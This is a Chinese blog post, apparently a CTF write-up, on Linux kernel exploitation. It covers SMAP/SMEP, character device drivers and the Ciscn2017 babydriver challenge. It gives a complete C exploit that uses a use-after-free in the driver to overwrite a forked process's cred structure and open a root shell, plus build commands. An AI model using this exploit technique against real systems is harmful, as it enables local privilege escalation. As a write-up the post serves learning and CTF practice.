@@ -1,0 +1,145 @@
+<!DOCTYPE html><html lang="zh-CN"><head><title>Kernel Pwn的简单尝试</title><meta http-equiv="content-type" content="text/html; charset=utf-8"><meta name="viewport" content="width=device-width, initial-scale=0.5"><link rel="icon" type="image/svg+xml" href="/favicon.svg"><link rel="stylesheet" href="/css/highlight/xcode.min.css"><link rel="stylesheet" href="/css/bootstrap/bootstrap-tooltips.css"><link rel="stylesheet" href="/css/post.css"><script src="/js/jquery.min.js"></script><meta name="generator" content="Hexo 5.4.2"></head><body><script>if (/mobile/i.test(navigator.userAgent) || /android/i.test(navigator.userAgent)) {
+  document.body.classList.add('mobile')
+}</script><div><div class="inner"><h1>Kernel Pwn的简单尝试</h1><div class="time">2022-12-04</div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="toc-text">基础知识</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E8%AE%BE%E5%A4%87%E9%A9%B1%E5%8A%A8"><span class="toc-text">字符设备驱动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Ciscn2017-babydriver"><span class="toc-text">Ciscn2017  babydriver</span></a></li></ol><h2 id="基础知识"><a href="#基础知识" class="headerlink" title="基础知识"></a>基础知识</h2><p>smap：Supervisor Mode Access Prevention，管理模式访问保护。</p>
+<p>smep：Supervisor Mode Access Prevention，管理模式执行保护。</p>
+<p>smap/smep用于阻止内核空间直接访问/执行用户空间的数据。</p>
+<br>
+
+<pre><code class="C">// copy_to_user: 从内核空间拷贝数据到用户空间
+unsigned long copy_to_user(void *to, const void __user *from, usigned long count);
+// 1) to 目标地址，这个地址是用户空间的地址；
+// 2) from 源地址，这个地址是内核空间的地址；
+// 3) count 将要拷贝的数据的字节数。
+
+// copy_from_user: 从用户空间拷贝数据到内核空间
+unsigned long copy_from_user(void __user *to, const void *from, usigned long count);
+// 1) to 目标地址，这个地址是内核空间的地址；
+// 2) from 源地址，这个地址是用户空间的地址；
+// 3) count 将要拷贝的数据的字节数。
+</code></pre>
+<br>
+
+<p><img src="/images/Kernel%20Pwn%E7%9A%84%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/image-20221204122228943.png" alt="image-20221204122228943"></p>
+<br>
+
+<h2 id="字符设备驱动"><a href="#字符设备驱动" class="headerlink" title="字符设备驱动"></a>字符设备驱动</h2><p><img src="/images/Kernel%20Pwn%E7%9A%84%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/image-20221129185635678.png" alt="image-20221129185635678"></p>
+<ul>
+<li><p>在Linux内核中，使用cdev结构体来描述字符设备的信息；</p>
+<ul>
+<li>成员<code>dev_t dev;</code>为设备号，用于唯一地标识字符设备；</li>
+<li>成员<code>const struct file_operations *ops;</code>用于定义字符设备驱动提供给VFS的接口函数，如常见的open()、read()、write()等等；  </li>
+</ul>
+<br></li>
+</ul>
+<p>在Linux字符设备驱动中，模块的加载通过<code>register_chrdev_region()</code> / <code>alloc_chrdev_region()</code> 来<code>静态</code> / <code>动态</code>获取设备号。通过<code>cdev_init()</code>建立<code>cdev</code>与<code>file_operations</code>之间的连接，通过<code>cdev_add()</code>向系统添加一个cdev以完成注册。模块的卸载通过<code>cdev_del()</code>来注销cdev，通过<code>unregister_chrdev_region()</code>来释放设备号。</p>
+<p>通过实现<code>file_operations</code>中的部分函数，来定义该字符驱动函数独特提供给VFS的接口函数，如open()、read()、write()，用于用户对该字符设备进行使用。</p>
+<img src="/images/Kernel%20Pwn%E7%9A%84%E7%AE%80%E5%8D%95%E5%B0%9D%E8%AF%95/image-20221203083840144.png" alt="image-20221203083840144" style="zoom:80%;" />
+
+<br>
+
+<h2 id="Ciscn2017-babydriver"><a href="#Ciscn2017-babydriver" class="headerlink" title="Ciscn2017  babydriver"></a>Ciscn2017  babydriver</h2><pre><code class="shell">附件解压：
+tar -xvf babydriver.tar
+</code></pre>
+<p>得到三个文件：</p>
+<p>boot.sh：指定了相应的参数去运行qume的shell命令；</p>
+<p>bzImage：内核镜像文件；（可通过file命令查看版本号）</p>
+<p>rootfs.cpio：磁盘镜像(文件系统)；</p>
+<br>
+
+<pre><code class="shell">./boot.sh  #启动(去掉--enable-kvm)
+</code></pre>
+<nr>
+
+<p>对文件系统分析：</p>
+<p>（注意: cpio gzip）</p>
+<pre><code class="shell">提取文件：
+cpio -idmv &lt; rootfs.cpio
+</code></pre>
+<br>
+
+<p>init文件：qemu启动系统后，执行的一系列初始化命令。（flag文件的问题）</p>
+<p>insmod命令：插入内核模块</p>
+<p>rmmod命令：卸载内核模块</p>
+<pre><code class="C">module_init(kernel_module_init);  //载入内核模块
+module_exit(kernel_module_exit);  //卸载内核模块
+</code></pre>
+<br>
+
+<p>babydriver.ko驱动模块分析：</p>
+<ul>
+<li>babydriver_init函数：载入模块时执行。</li>
+<li>babydriver_exit函数：卸载模块时执行。</li>
+<li>babyopen函数 –&gt; open(fd, )</li>
+<li>babyrelease函数 –&gt; close()</li>
+<li>babyread函数 –&gt; read()</li>
+<li>babywrite函数 –&gt; write()</li>
+<li>babyioctl函数 –&gt; ioctl()</li>
+</ul>
+<br>
+
+<p>关键点：babydev_struct定义bss段中，为全局变量。</p>
+<p>打开两次设备，所使用的babydev_struct为同一块。</p>
+<br>
+
+<p><code>babyrelease</code>函数中存在UAF漏洞，打开两个设备后，close()其中一个，另一个还可以使用babydev_struct。</p>
+<p>ioctl()函数中可以修改buf的大小为cred结构体同大小，然后close()，随后fork个子进程使得cred和babydev_struct为同个空间。使用UAF修改该块空间（cred为root权限）,子进程的权限即变为root。</p>
+<pre><code class="C">#include &lt;stdio.h&gt;
+#include &lt;stdlib.h&gt;
+#include &lt;unistd.h&gt;
+#include &lt;fcntl.h&gt;
+#include &lt;sys/wait.h&gt;
+#include &lt;sys/stat.h&gt;
+
+int main()
+&#123;
+    // 打开两次设备
+    int fd1 = open(&quot;/dev/babydev&quot;, 2);
+    int fd2 = open(&quot;/dev/babydev&quot;, 2);
+
+    // 修改 babydev_struct.device_buf_len 为 sizeof(struct cred)
+    ioctl(fd1, 0x10001, 0xa8);
+
+    // 释放 fd1
+    close(fd1);
+
+    // 新起进程的 cred 空间会和刚刚释放的 babydev_struct 重叠
+    int pid = fork();
+    if(pid &lt; 0)
+    &#123;
+        puts(&quot;[*] fork error!&quot;);
+        exit(0);
+    &#125;
+    else if(pid == 0)
+    &#123;
+        // 通过更改 fd2，修改新进程的 cred 的 uid，gid 等值为0
+        char zeros[30] = &#123;0&#125;;
+        write(fd2, zeros, 28);
+
+        if(getuid() == 0)
+        &#123;
+            puts(&quot;[+] root now.&quot;);
+            system(&quot;/bin/sh&quot;);
+            exit(0);
+        &#125;
+    &#125;
+    else
+    &#123;
+        wait(NULL);
+    &#125;
+    close(fd2);
+
+    return 0;
+&#125;
+</code></pre>
+<br>
+
+<pre><code class="shell"># 静态编译
+gcc -static exploit.c -o exploit
+
+# 打包
+find . | cpio -o --format=newc &gt; rootfs.cpio
+</code></pre>
+<p class="textAlignRight"><span>↶ </span><a href="/">返回首页</a><span></span></p></div></div></body><script src="/js/highlight.min.js"></script><script src="/js/main.js"></script><script src="/js/bootstrap/bootstrap.min.js"></script><script>window.dataLayer = window.dataLayer || [];
+function gtag(){dataLayer.push(arguments);}
+gtag('js', new Date());
+gtag('config', '');</script></html>
